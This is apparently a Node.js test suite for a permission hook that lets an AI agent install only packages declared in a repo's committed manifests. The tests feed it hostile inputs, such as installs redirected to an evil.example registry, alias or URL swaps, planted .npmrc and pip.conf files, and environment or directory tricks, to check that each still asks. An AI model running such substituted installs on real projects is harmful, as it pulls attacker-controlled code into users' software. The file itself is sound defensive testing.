// An install of a package the repo already declares (in the committed
// manifest) is no decision, so it doesn't ask. Anything else still does.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { writeFileSync, mkdirSync } from 'node:fs';
import { join } from 'node:path';
import { spawnSync } from 'node:child_process';
import { hook, base, CLI } from './helpers.mjs';
import { tempRepo } from './verify.test.mjs';

// Declared is read at the commit the session started from, so each test
// starts its session after committing the manifest.
const start = (dir, session = 's1') => hook('session-start', base(dir, { session_id: session }));
const bash = (dir, command, extra = {}) => hook('pre-bash', base(dir, { tool_input: { command }, ...extra }));
const asked = (out) => out?.hookSpecificOutput?.permissionDecision === 'ask';

function npmRepo() {
  const { dir, g } = tempRepo();
  writeFileSync(join(dir, 'package.json'), JSON.stringify({
    name: 'app', dependencies: { lodash: '^4' }, devDependencies: { vitest: '^3', '@types/node': '^22' },
    optionalDependencies: { fsevents: '*' }, peerDependencies: { react: '>=18' },
  }));
  g('add', '-A'); g('commit', '-qm', 'pkg');
  start(dir);
  return { dir, g };
}

test('npm: installs of declared packages, in any of the four fields, do not ask', () => {
  const { dir } = npmRepo();
  for (const cmd of ['npm i lodash', 'npm install -D vitest@3', 'pnpm add @types/node@^22.1', 'yarn add react', 'bun add fsevents', 'npm i lodash vitest', 'npm i "lodash@~4.17"']) {
    assert.equal(bash(dir, cmd), null, cmd);
  }
});

test('npm: an undeclared package asks, and the ask names only the undeclared ones', () => {
  const { dir } = npmRepo();
  const out = bash(dir, 'npm i lodash left-padd');
  assert.ok(asked(out));
  assert.match(out.hookSpecificOutput.permissionDecisionReason, /left-padd/);
  assert.doesNotMatch(out.hookSpecificOutput.permissionDecisionReason, /lodash/);
});

test('npm: an alias, URL, git ref, tarball or path under a declared name still asks', () => {
  const { dir } = npmRepo();
  for (const cmd of ['npm i lodash@npm:evil-pkg', 'npm i lodash@https://evil.example/x.tgz', 'npm i github:evil/lodash', 'npm i lodash@git+ssh://evil/x', 'npm i lodash@file:../x', 'npm i evil/lodash']) {
    assert.ok(asked(bash(dir, cmd)), cmd);
  }
});

test('a name added to package.json but not committed still asks', () => {
  const { dir } = npmRepo();
  writeFileSync(join(dir, 'package.json'), JSON.stringify({ dependencies: { lodash: '^4', 'evil-pkg': '1' } }));
  assert.ok(asked(bash(dir, 'npm i evil-pkg')));
});

test('the nearest package.json is the one read', () => {
  const { dir, g } = npmRepo();
  mkdirSync(join(dir, 'web'));
  writeFileSync(join(dir, 'web/package.json'), JSON.stringify({ dependencies: { astro: '^5' } }));
  g('add', '-A'); g('commit', '-qm', 'web');
  start(dir, 's2');
  assert.equal(bash(dir, 'npm i astro', { cwd: join(dir, 'web'), session_id: 's2' }), null);
  assert.ok(asked(bash(dir, 'npm i lodash', { cwd: join(dir, 'web'), session_id: 's2' })), 'lodash is declared in the root, not in web/');
  assert.ok(asked(bash(dir, 'npm i astro', { session_id: 's2' })), 'astro is declared in web/, not in the root');
});

test('a package.json that does not parse declares nothing', () => {
  const { dir, g } = tempRepo();
  writeFileSync(join(dir, 'package.json'), '{ "dependencies": { "lodash": ');
  g('add', '-A'); g('commit', '-qm', 'bad');
  start(dir);
  assert.ok(asked(bash(dir, 'npm i lodash')));
});

test('pip: requirements*.txt and pyproject.toml declare packages', () => {
  const { dir, g } = tempRepo();
  writeFileSync(join(dir, 'requirements.txt'), '# deps\nRequests>=2.0  # http\n-r other.txt\n');
  writeFileSync(join(dir, 'requirements-dev.txt'), 'pytest==8.1\n');
  writeFileSync(join(dir, 'pyproject.toml'), [
    '[project]', 'name = "myapp"', 'dependencies = [', '  "httpx[http2]>=0.27",', '  "pydantic",', ']',
    '[project.optional-dependencies]', 'docs = ["mkdocs>=1"]',
    '[dependency-groups]', 'lint = ["ruff"]',
    '[tool.poetry.dependencies]', 'python = "^3.12"', 'rich = "^13"',
    '[tool.poetry.group.dev.dependencies]', 'mypy = "*"',
  ].join('\n'));
  g('add', '-A'); g('commit', '-qm', 'py');
  start(dir);
  for (const cmd of ['pip install requests', 'pip install pytest', 'pip3 install "httpx[http2]"', 'uv add pydantic>=2', 'pip install mkdocs', 'uv add ruff', 'poetry add rich', 'poetry add mypy', 'pip install Requests==2.32']) {
    assert.equal(bash(dir, cmd), null, cmd);
  }
  for (const cmd of ['pip install myapp', 'pip install python', 'pip install evil-pkg', 'pip install requests@https://evil.example/r.whl', 'pip install git+https://evil/requests']) {
    assert.ok(asked(bash(dir, cmd)), cmd);
  }
});

test('other ecosystems keep asking', () => {
  const { dir } = npmRepo();
  assert.ok(asked(bash(dir, 'cargo add lodash')));
});

test('a declared name fetched from another registry or index still asks', () => {
  const { dir, g } = npmRepo();
  writeFileSync(join(dir, 'requirements.txt'), 'requests\n');
  g('add', '-A'); g('commit', '-qm', 'req');
  start(dir, 's3');
  for (const cmd of ['npm i --@evil:registry=https://evil.example lodash', 'npm i --userconfig ./x lodash', 'export NPM_CONFIG_REGISTRY=https://evil.example; npm i lodash', 'env YARN_NPM_REGISTRY_SERVER=https://evil.example yarn add lodash', 'pip install -r extra.txt requests', 'pip install --pre --index https://evil.example requests']) {
    assert.ok(asked(bash(dir, cmd, { session_id: 's3' })), cmd);
  }
  for (const cmd of ['npm i lodash --registry https://evil.example', 'npm_config_registry=https://evil.example npm i lodash', 'pip install --index-url https://evil.example requests', 'pip install -i https://evil.example requests', 'pip install --extra-index-url https://evil.example requests', 'PIP_INDEX_URL=https://evil.example pip install requests', 'uv add --index https://evil.example requests', 'poetry add --source evil requests', 'pip install --find-links ./wheels requests']) {
    assert.ok(asked(bash(dir, cmd, { session_id: 's3' })), cmd);
  }
});

test('a manifest committed during the session is not trusted until a later session', () => {
  const { dir, g } = npmRepo();
  writeFileSync(join(dir, 'package.json'), JSON.stringify({ dependencies: { lodash: '^4', 'evil-pkg': '1' } }));
  g('add', '-A'); g('commit', '-qm', 'add evil-pkg');
  assert.ok(asked(bash(dir, 'npm i evil-pkg')), 'committed after the session started');
  assert.ok(asked(bash(dir, 'npm i lodash')), 'a manifest changed since the session start can carry overrides, so nothing is skipped');
  start(dir, 'later');
  assert.equal(bash(dir, 'npm i evil-pkg', { session_id: 'later' }), null, 'a later session starts from the new commit');
});

test('a session with no recorded start commit asks', () => {
  const { dir } = npmRepo();
  assert.ok(asked(bash(dir, 'npm i lodash', { session_id: 'unknown' })));
});

test('registry config, a lockfile or the manifest changed in the working copy: installs ask', () => {
  for (const [file, text] of [['.npmrc', 'registry=https://evil.example\n'], ['web/.npmrc', 'registry=https://evil.example\n'], ['package-lock.json', '{}'], ['package.json', JSON.stringify({ dependencies: { lodash: '^4' }, overrides: { lodash: 'npm:evil-pkg' } })], ['pip.conf', '[global]\nindex-url = https://evil.example\n']]) {
    const { dir } = npmRepo();
    mkdirSync(join(dir, 'web'), { recursive: true });
    writeFileSync(join(dir, file), text);
    assert.ok(asked(bash(dir, 'npm i lodash')), file);
  }
});

test('registry config committed during the session, or ignored by git, makes installs ask', () => {
  const a = npmRepo();
  writeFileSync(join(a.dir, '.npmrc'), 'registry=https://evil.example\n');
  a.g('add', '-A'); a.g('commit', '-qm', 'npmrc');
  assert.ok(asked(bash(a.dir, 'npm i lodash')), 'committed after the session started');
  const b = npmRepo();
  writeFileSync(join(b.dir, '.gitignore'), '.npmrc\n');
  b.g('add', '-A'); b.g('commit', '-qm', 'ignore');
  start(b.dir, 'b');
  writeFileSync(join(b.dir, '.npmrc'), 'registry=https://evil.example\n');
  assert.ok(asked(bash(b.dir, 'npm i lodash', { session_id: 'b' })), 'an ignored .npmrc');
});

test('a variable set or a directory left in an earlier segment makes installs ask; cd within the repo does not', () => {
  const { dir, g } = npmRepo();
  mkdirSync(join(dir, 'web'));
  writeFileSync(join(dir, 'web/package.json'), JSON.stringify({ dependencies: { astro: '^5' } }));
  g('add', '-A'); g('commit', '-qm', 'web');
  start(dir, 'c');
  for (const cmd of ['export HOME=/tmp/evil; npm i lodash', 'HOME=/tmp/evil && npm i lodash', '(HOME=/tmp/x; npm i lodash)', 'cd /tmp && npm i lodash', 'cd .. && npm i lodash', 'cd ~ && npm i lodash', 'cd && npm i lodash', 'source evil.sh; npm i lodash', 'pushd /tmp; npm i lodash']) {
    assert.ok(asked(bash(dir, cmd, { session_id: 'c' })), cmd);
  }
  assert.equal(bash(dir, 'cd web && npm i astro', { session_id: 'c' }), null);
});

// jig observe: what the owner reads before deciding whether a gate enforces.
test('jig observe summarises observe.jsonl: counts by gate and decision, date range, top reasons', () => {
  const { dir } = tempRepo();
  mkdirSync(join(dir, '.git/jig'), { recursive: true });
  const day = (d) => Date.parse(`2026-11-${d}T12:00:00Z`);
  const ev = (d, gate, decision, reason) => JSON.stringify({ v: 1, t: day(d), hook: 'pre-bash', gate, decision, reason });
  writeFileSync(join(dir, '.git/jig/observe.jsonl'), [
    ev(20, 'commit', 'ask', "jig: this commit's tree (abc1234) has no current passing evidence"),
    ev(21, 'commit', 'ask', "jig: this commit's tree (def5678) has no current passing evidence"),
    ev(22, 'commit', 'ask', "jig: this commit's tree (0a1b2c3d) has no current passing evidence"),
    ev(22, 'rules', 'ask', 'jig: CLAUDE.md is a rule file'),
    ev(23, 'tree', 'block', 'jig: files changed'),
    'not json',
  ].join('\n') + '\n');
  const r = spawnSync('node', [CLI, 'observe'], { cwd: dir, encoding: 'utf8' });
  assert.equal(r.status, 0, r.stderr);
  assert.match(r.stdout, /5 events, 2026-11-20 to 2026-11-23/);
  assert.match(r.stdout, /^\s*commit\s+ask\s+3$/m);
  assert.match(r.stdout, /^\s*rules\s+ask\s+1$/m);
  assert.match(r.stdout, /^\s*tree\s+block\s+1$/m);
  assert.match(r.stdout, /^\s*3\s+commit\s+jig: this commit's tree \(<id>\) has no current passing evidence$/m, 'tree ids are grouped into one reason');
});

test('jig observe with no log says so and exits 0', () => {
  const { dir } = tempRepo();
  const r = spawnSync('node', [CLI, 'observe'], { cwd: dir, encoding: 'utf8' });
  assert.equal(r.status, 0, r.stderr);
  assert.match(r.stdout, /no events/);
});
